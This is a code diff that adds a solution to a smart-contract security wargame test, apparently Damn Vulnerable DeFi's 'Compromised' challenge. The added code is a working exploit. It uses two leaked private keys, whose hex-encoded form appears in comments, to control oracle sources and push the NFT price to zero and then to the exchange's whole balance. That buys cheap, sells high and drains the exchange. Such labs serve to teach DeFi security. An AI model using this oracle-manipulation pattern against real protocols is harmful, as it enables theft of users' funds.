@@ -61,6 +61,57 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+
+        //4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+        const str1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        
+        const signer1 = new ethers.Wallet(str1, ethers.provider);
+
+        //4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+        const str2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        const signer2 = new ethers.Wallet(str2, ethers.provider);
+
+        const symbol = "DVNFT";
+
+        let initialPrice = await this.oracle.getMedianPrice(symbol);
+        console.log('initialPrice', initialPrice.toString());
+
+        await this.oracle.connect(signer1).postPrice(symbol, 0);
+        await this.oracle.connect(signer2).postPrice(symbol, 0);
+        
+        let medianPrice = await this.oracle.getMedianPrice(symbol);
+        console.log('medianPrice', medianPrice.toString());
+
+        let bal = await ethers.provider.getBalance(attacker.address);
+        console.log('bal', bal.toString());
+
+        const txn = await this.exchange.connect(attacker).buyOne({value: 1});
+        console.log('txn', txn);
+        const txnResult = await txn.wait();
+        console.log('txnResult', txnResult);
+        console.log('txnResult event eventSignature', txnResult.events[1].eventSignature);
+        console.log('txnResult event args', txnResult.events[1].args);
+        
+        await this.oracle.connect(signer1).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);
+        await this.oracle.connect(signer2).postPrice(symbol, EXCHANGE_INITIAL_ETH_BALANCE);
+        
+        medianPrice = await this.oracle.getMedianPrice(symbol);
+        console.log('medianPrice', medianPrice.toString());
+
+        bal = await ethers.provider.getBalance(attacker.address);
+        console.log('bal', bal.toString());
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        bal = await ethers.provider.getBalance(attacker.address);
+        console.log('bal', bal.toString());
+
+        // let balOfExchange = await ethers.provider.getBalance(this.exchange.address);
+        // console.log('balOfExchange', balOfExchange.toString());
+
+        await this.oracle.connect(signer1).postPrice(symbol, initialPrice);
+        await this.oracle.connect(signer2).postPrice(symbol, initialPrice);
     });
 
     after(async function () {
